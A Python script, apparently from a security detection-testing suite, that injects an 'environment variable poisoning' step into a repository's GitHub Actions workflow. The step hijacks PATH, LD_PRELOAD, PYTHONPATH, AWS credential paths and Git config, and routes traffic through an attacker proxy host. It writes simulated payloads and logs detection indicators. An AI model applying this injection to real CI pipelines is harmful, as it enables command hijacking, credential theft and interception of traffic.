#!/usr/bin/env python3
"""Attack Scenario 8.3: Environment Variable Poisoning - Sneaky Attack"""
import sys
import json
import shutil
from pathlib import Path
from datetime import datetime

class EnvPoisoningAttack:
    """Injects malicious environment variables (PATH, LD_PRELOAD, config files)."""

    def __init__(self):
        self.repo_root = Path(__file__).parent.parent.parent.parent
        self.backup_suffix = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.workflow_file = self.repo_root / ".github" / "workflows" / "ci-pipeline.yml"

    def inject_attack(self):
        """Inject malicious environment variable manipulation."""
        if not self.workflow_file.exists():
            print(f"[!] Workflow file not found: {self.workflow_file}")
            return False

        # Backup original
        backup_file = self.workflow_file.parent / f"ci-pipeline.yml.backup_{self.backup_suffix}"
        shutil.copy2(self.workflow_file, backup_file)

        # Read workflow
        with open(self.workflow_file, 'r') as f:
            content = f.read()

        # Create malicious env poisoning step
        malicious_step = '''
      # RESEARCH ATTACK 8.3: Environment Variable Poisoning
      - name: Setup build environment
        env:
          # ATTACK: PATH hijacking - malicious binaries executed first
          PATH: /tmp/attacker-bins:${{ env.PATH }}

          # ATTACK: LD_PRELOAD library injection (Linux)
          LD_PRELOAD: /tmp/malicious.so

          # ATTACK: Python path poisoning
          PYTHONPATH: /tmp/malicious-modules:${{ env.PYTHONPATH }}

          # ATTACK: AWS config redirection
          AWS_CONFIG_FILE: /tmp/evil-aws-config
          AWS_SHARED_CREDENTIALS_FILE: /tmp/stolen-creds

          # ATTACK: Node.js module hijacking
          NODE_PATH: /tmp/malicious-node-modules

          # ATTACK: Git config poisoning
          GIT_CONFIG_GLOBAL: /tmp/evil-gitconfig

          # ATTACK: Proxy injection for MITM
          HTTP_PROXY: http://attacker-proxy.example.com:8080
          HTTPS_PROXY: http://attacker-proxy.example.com:8080

        run: |
          echo "=== Environment Poisoning Attack ==="

          # Create fake malicious binaries (simulated)
          mkdir -p /tmp/attacker-bins || true
          echo '#!/bin/bash' > /tmp/attacker-bins/git || true
          echo 'echo "[ATTACK] Hijacked git command"' >> /tmp/attacker-bins/git || true
          chmod +x /tmp/attacker-bins/git || true

          # Create fake library (simulated)
          echo "FAKE_MALICIOUS_LIBRARY" > /tmp/malicious.so || true

          # Create fake Python module
          mkdir -p /tmp/malicious-modules || true
          echo "print('[ATTACK] Malicious Python module loaded')" > /tmp/malicious-modules/__init__.py || true

          # Create fake AWS config
          echo "[default]" > /tmp/evil-aws-config || true
          echo "region = attacker-region" >> /tmp/evil-aws-config || true

          # Log attack indicators
          echo "ATTACK_INDICATOR: path_hijacking=true"
          echo "ATTACK_INDICATOR: ld_preload_injection=true"
          echo "ATTACK_INDICATOR: pythonpath_poisoning=true"
          echo "ATTACK_INDICATOR: aws_config_redirection=true"
          echo "ATTACK_INDICATOR: proxy_injection=true"
          echo "ATTACK_INDICATOR: env_poisoning_severity=high"

          # Show poisoned environment (partial)
          echo "PATH=$PATH" | head -c 100
          echo "LD_PRELOAD=$LD_PRELOAD"
          echo "PYTHONPATH=$PYTHONPATH" | head -c 100
'''

        # Find insertion point (after checkout)
        if "- uses: actions/checkout@" in content:
            parts = content.split("- uses: actions/checkout@", 1)
            remaining = parts[1]
            next_step_idx = remaining.find("\n      - name: Setup")
            if next_step_idx == -1:
                next_step_idx = remaining.find("\n      - name: Build")
            if next_step_idx != -1:
                content = (parts[0] + "- uses: actions/checkout@" +
                          remaining[:next_step_idx] + malicious_step +
                          remaining[next_step_idx:])

        # Write modified workflow
        with open(self.workflow_file, 'w') as f:
            f.write(content)

        print(f"[OK] Injected environment poisoning into {self.workflow_file.name}")
        print(f"[OK] Backup: {backup_file.name}")
        return True

    def log_indicators(self):
        """Log attack behavioral indicators."""
        indicators = {
            "attack_type": "environment_variable_poisoning",
            "scenario_id": "8.3",
            "timestamp": datetime.now().isoformat(),
            "severity": "high",
            "indicators": {
                "env_poisoning": True,
                "path_hijacking": True,
                "ld_preload_injection": True,
                "pythonpath_poisoning": True,
                "aws_config_redirection": True,
                "node_path_hijacking": True,
                "proxy_injection": True,
                "git_config_poisoning": True,
                "workflow_modified": True,
                "poisoned_variables": [
                    "PATH",
                    "LD_PRELOAD",
                    "PYTHONPATH",
                    "AWS_CONFIG_FILE",
                    "AWS_SHARED_CREDENTIALS_FILE",
                    "NODE_PATH",
                    "GIT_CONFIG_GLOBAL",
                    "HTTP_PROXY",
                    "HTTPS_PROXY"
                ]
            },
            "expected_detection": {
                "difficulty": "hard",
                "primary_signals": [
                    "unusual_env_vars",
                    "path_modification",
                    "ld_preload_usage",
                    "proxy_configuration",
                    "config_file_redirection",
                    "workflow_env_changes"
                ],
                "detection_tools": [
                    "Environment monitoring",
                    "Workflow auditing",
                    "Runtime security",
                    "Container security",
                    "Process monitoring"
                ]
            },
            "mitre_attack": {
                "technique": "T1574.006",
                "name": "Hijack Execution Flow: Dynamic Linker Hijacking",
                "tactic": "Persistence, Privilege Escalation"
            },
            "real_world_frequency": "medium",
            "impact": {
                "command_hijacking": "high",
                "library_injection": "high",
                "credential_theft": "high",
                "mitm_attack": "high"
            }
        }

        # Save indicators
        log_dir = Path(__file__).parent.parent / "logs" / "indicators"
        log_dir.mkdir(parents=True, exist_ok=True)

        with open(log_dir / f"env_poisoning_{self.backup_suffix}.json", 'w') as f:
            json.dump(indicators, f, indent=2)

        return indicators

    def execute(self):
        """Execute the attack."""
        print("=" * 80)
        print("ATTACK SCENARIO 8.3: Environment Variable Poisoning")
        print("=" * 80)
        print("Severity: HIGH")
        print("Realism: 8/10 - Advanced but realistic")
        print("Impact: Command hijacking, library injection, MITM")
        print()

        if self.inject_attack():
            self.log_indicators()
            print()
            print("[OK] Attack successfully injected!")
            print("[OK] Environment variables poisoned (PATH, LD_PRELOAD, etc.)")
            print("[!] Detection: Environment monitoring, runtime security")
            print("=" * 80)
            return True
        else:
            print("[FAIL] Attack injection failed")
            return False

if __name__ == "__main__":
    sys.exit(0 if EnvPoisoningAttack().execute() else 1)
